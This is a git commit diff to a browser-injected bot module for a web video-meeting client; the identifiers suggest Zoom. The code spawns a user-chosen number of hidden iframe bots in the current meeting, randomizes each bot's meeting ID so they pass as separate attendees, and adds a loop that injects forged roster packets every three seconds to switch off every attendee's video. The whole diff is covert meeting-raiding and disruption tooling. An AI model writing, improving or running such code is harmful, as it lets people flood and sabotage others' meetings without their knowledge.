e5bddcaa53b510c2a0725fbeb70c42f826f16185
crackbob <crackbob.999@gmail.com>
2025-04-28 22:24:42 -0400

    more performant bots

--- src/Modules/BotMeeting.js
+++ src/Modules/BotMeeting.js
@@ -2,50 +2,72 @@ import SDK from "../SDK/SDK";
 
 let offset = 0;
 
-function createBot (container) {
+function createBot(container) {
     let frame = document.createElement('iframe');
     frame.src = meetingURL;
-    frame.style.resize = "both";
-    frame.style.border = "none";
-    frame.style.margin = "5px";
+    frame.style.display = 'none';
     container.appendChild(frame);
 
     let botSDK = new SDK(frame.contentWindow);
-
     frame.contentWindow.thugbot = true;
 
     frame.onload = function () {
-        Object.values(botSDK.hooks.findModule("webClient_meetingUqiueId:")).find(prop => prop?.webClient_meetingUqiueId).webClient_meetingUqiueId = Math.random().toString(36).substring(2,7);
+        const module = Object.values(botSDK.hooks.findModule("webClient_meetingUqiueId:"))
+            .find(prop => prop?.webClient_meetingUqiueId);
+        if (module) {
+            module.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7);
+        }
+
         botSDK.loaded = true;
-    }
+
+        // Try to disable everyone's video every few seconds
+        setInterval(function () {
+            try {
+                let updates = botSDK.hooks.state.attendeesList.attendeesList.map(attendee => ({
+                    bVideoOn: false,
+                    id: attendee.userId
+                }));
+
+                let packet = {
+                    evt: botSDK.hooks.packets.WS_CONF_ROSTER_INDICATION,
+                    body: {
+                        add: null,
+                        remove: null,
+                        update: updates
+                    }
+                };
+
+                botSDK.hooks.meetingSocket.handlers.onMessage({
+                    data: JSON.stringify(packet)
+                });
+            } catch (error) {
+
+            }
+        }, 3000);
+    };
 
     window.bots.push(botSDK);
-
-    return { botSDK }
+    return { botSDK };
 }
 
-
-function BotMeeting () {
+function BotMeeting() {
     window.bots = window.bots || [];
     let mainSDKInstance = this;
-    let amount = prompt("how many bots?");
+    let amount = parseInt(prompt("How many bots?"), 10);
 
     localStorage.clear();
     window.meetingURL = mainSDKInstance.scope.location.href;
-    let botWindow = window.open("about:blank", "Bot Panel - " + offset, "width=500, height=400, left=100, top=100");
 
-    offset++;
-
-    botWindow.document.title = "Bot Panel";
-    botWindow.document.body.style.backgroundColor = "black";
-
-    let container = document.createElement("div");
-    container.style.display = "column wrap";
-    botWindow.document.body.appendChild(container);
+    let containerFrame = document.createElement('iframe');
+    containerFrame.style.display = 'none';
+    containerFrame.src = 'about:blank';
+    document.body.appendChild(containerFrame);
 
     for (let i = 0; i < amount; i++) {
-        createBot(container);
+        createBot(containerFrame.contentWindow.document.body);
     }
+
+    offset++;
 }
 
 export default BotMeeting;
